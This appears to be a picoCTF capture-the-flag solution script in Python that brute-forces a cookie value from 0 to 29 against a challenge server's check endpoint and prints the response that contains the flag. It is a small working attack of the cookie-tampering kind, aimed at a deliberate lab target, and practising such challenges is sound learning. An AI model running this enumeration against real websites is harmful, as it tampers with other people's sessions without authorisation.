import requests
for i in range(30):
    cookie = 'name={}'.format(i)
    header = {'Cookie':cookie}
    r = requests.get("http://mercury.picoctf.net:27177/check", headers=header)
    if(r.status_code ==200) and ('picoCTF{' in r.text):
        print(r.text)